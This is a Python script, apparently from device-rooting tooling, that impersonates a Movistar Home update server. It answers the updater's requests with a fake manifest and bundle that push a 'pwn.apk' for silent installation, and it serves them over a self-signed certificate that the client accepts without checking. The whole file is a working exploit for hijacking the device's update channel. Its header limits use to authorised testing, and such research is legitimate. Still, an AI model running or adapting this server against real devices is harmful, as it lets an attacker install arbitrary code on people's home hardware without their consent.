# SANITIZED for publication. Part of the off-kernel TR-069/Troya tooling.
# Host addresses, key filenames and credentials were replaced with placeholders.
# Use only on a device you own / are authorised to test.
#!/usr/bin/env python3
# Fake Troya backend: serves the updater's app-update manifest + our APK, accept-any TLS.
import ssl, os, sys, json, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
BASE=os.path.dirname(os.path.abspath(__file__)); PORT=int(sys.argv[1]) if len(sys.argv)>1 else 443
APK=os.path.join(BASE,"troya/pwn.apk"); HOST="api.es-pro.movistar-home.com"
ZIP=os.path.join(BASE,"troya/packages.zip")
LOG=os.path.join(BASE,"troya_backend.log")
def log(m):
    import time
    with open(LOG,"a") as f: f.write(time.strftime("[%Y-%m-%d %H:%M:%S] ")+m+"\n")
    print(m,flush=True)
class H(BaseHTTPRequestHandler):
    def _send(self,code,body,ct="application/json"):
        b=body.encode() if isinstance(body,str) else body
        self.send_response(code); self.send_header("Content-Type",ct)
        self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_GET(self):
        p=self.path.split("?")[0]; log("GET "+self.path)
        if p.endswith("/v1/updates/sw"):
            # updater: response2file -> packages.zip -> unzip -> packages/descriptor -> apps[] -> per-app MD5 check -> silent install
            self._send(200, json.dumps({"hasUpdate":True,"url":"https://%s/packages.zip"%HOST}))
        elif p.endswith("/packages.zip") and os.path.exists(ZIP):
            self._send(200, open(ZIP,"rb").read(), "application/zip")
        elif p.endswith("/bundle.json"):
            self._send(200, json.dumps({"apps":[{"apk":"https://%s/pwn.apk"%HOST,"package":"com.mh.pwn","signature":"","version_code":1}],"bundle_version":"1"}))
        elif p.endswith("/pwn.apk") and os.path.exists(APK):
            self._send(200, open(APK,"rb").read(), "application/vnd.android.package-archive")
        elif p.endswith("/v1/updates/fw"):
            self._send(200, json.dumps({"hasUpdate":False,"url":""}))
        else:
            self._send(200, json.dumps({"hasUpdate":False,"url":""}))
    def log_message(self,*a): pass
ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.check_hostname=False
# self-signed cert (client trusts anything via UnsafeOkHttpClientBuilder)
os.system(f'openssl req -x509 -newkey rsa:2048 -keyout {BASE}/keys/<be-key> -out {BASE}/keys/<be-cert> -days 365 -nodes -subj "/CN={HOST}" 2>/dev/null')
ctx.load_cert_chain(os.path.join(BASE,"keys/<be-cert>"), os.path.join(BASE,"keys/<be-key>"))
srv=HTTPServer(("0.0.0.0",PORT),H); srv.socket=ctx.wrap_socket(srv.socket,server_side=True)
log("fake troya backend on :%d"%PORT); srv.serve_forever()
